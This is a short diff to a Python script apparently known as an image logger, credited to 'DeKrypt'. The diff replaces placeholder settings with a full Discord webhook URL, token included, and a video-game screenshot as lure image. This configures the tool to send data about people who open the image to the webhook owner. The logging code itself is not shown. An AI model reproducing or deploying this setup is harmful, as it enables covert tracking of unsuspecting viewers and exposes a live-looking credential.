@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1239060516945526864/n3UiUiP1Jaiz8J0-fI2ibBdQgkLOKzNMdFJVFU76YfrMpSgLTqPTqIu9aK-NAL3Kkfj6",
+    "image": "https://gamerjournalist.com/wp-content/uploads/2022/12/Snow-Rider-3D-Start-Screen.png?resize=768", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
